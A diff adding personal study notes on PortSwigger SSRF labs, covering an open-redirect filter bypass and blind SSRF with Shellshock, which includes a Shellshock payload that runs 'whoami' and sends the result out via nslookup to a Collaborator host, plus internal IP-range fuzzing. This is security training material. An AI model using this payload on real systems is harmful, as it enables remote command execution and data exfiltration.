@@ -122,5 +122,56 @@ The stock checker has been restricted to only access the local application, so y
 
 Analysis:
 
+- after decoding the `stockapi` parameter we observe that is not using any url in order to make a request to a different host 
+	![[Pasted image 20241002202146.png]]
+	
+- if we try to modify it we get another error on this topic so we need to change our approach and find a redirect(see next product page)
+	![[Pasted image 20241002202326.png]]
+	![[Pasted image 20241002202550.png]]
 
+- we will use the url of the next-product page to test execution of an open redirect 
+	![[Pasted image 20241002202855.png]]
 
+- copy this request back into the `stockApi` parameter(URL encode it) in order to make a request towards the `admin` host page.
+	**note**: we have to fuzz trough all list ip range to find out that one that is running in 8080 port (in our case is 192.168.0.**12**:8080)
+	![[Pasted image 20241002203438.png]]
+	![[Pasted image 20241002203759.png]]
+
+## **6. Blind SSRF with Shellshock exploitation**
+This site uses analytics software which fetches the URL specified in the Referer header when a product page is loaded.
+
+To solve the lab, use this functionality to perform a [blind SSRF](https://portswigger.net/web-security/ssrf/blind) attack against an internal server in the `192.168.0.X` range on port 8080. In the blind attack, use a Shellshock payload against the internal server to exfiltrate the name of the OS user.
+
+1. In [Burp Suite Professional](https://portswigger.net/burp/pro), install the Collaborator Everywhere extension from the BApp Store.
+2. Add the domain of the lab to Burp Suite's [target scope](https://portswigger.net/burp/documentation/desktop/tools/target/scope), so that Collaborator Everywhere will target it.
+3. Browse the site.
+4. Observe that when you load a product page, it triggers an HTTP interaction with Burp Collaborator, via the `Referer` header.
+5. Observe that the HTTP interaction contains your `User-Agent` string within the HTTP request.
+6. Send the request to the product page to Burp Intruder.
+7. Go to the [Collaborator](https://portswigger.net/burp/documentation/desktop/tools/collaborator) tab and generate a unique Burp Collaborator payload. Place this into the following Shellshock payload:
+    
+    `() { :; }; /usr/bin/nslookup $(whoami).BURP-COLLABORATOR-SUBDOMAIN`
+8. Replace the `User-Agent` string in the Burp Intruder request with the Shellshock payload containing your Collaborator domain.
+9. Change the `Referer` header to `http://192.168.0.1:8080` then highlight the final octet of the IP address (the number `1`), click **Add §**.
+10. In the **Payloads** side panel, change the payload type to **Numbers**, and enter 1, 255, and 1 in the **From** and **To** and **Step** boxes respectively.
+11. Click  **Start attack**.
+12. When the attack is finished, go to the **Collaborator** tab, and click **Poll now**. If you don't see any interactions listed, wait a few seconds and try again, since the server-side command is executed asynchronously. You should see a DNS interaction that was initiated by the back-end system that was hit by the successful blind [SSRF attack](https://portswigger.net/web-security/ssrf). The name of the OS user should appear within the DNS subdomain.
+13. To complete the lab, enter the name of the OS user.
+
+Analysis:
+- we observe two vulnerable parameters: `User-Agent` & `Referer`
+	![[Pasted image 20241002205157.png]]
+
+- we can exploit the `User-Agent` parameter for a ShellShock payload:
+```
+() { :; }; /usr/bin/nslookup $(whoami).BURP-COLLABORATOR-SUBDOMAIN
+```
+	![[Pasted image 20241002205444.png]]
+
+- we also need to blind SSRF via `Referer` parameter, fuzzing the ip range as we did in previous examples.
+	![[Pasted image 20241002205727.png]]
+	
+- we have received the response for whoami on our server via the shellshock
+	![[Pasted image 20241002210051.png]]
+
+**ShellShock:**
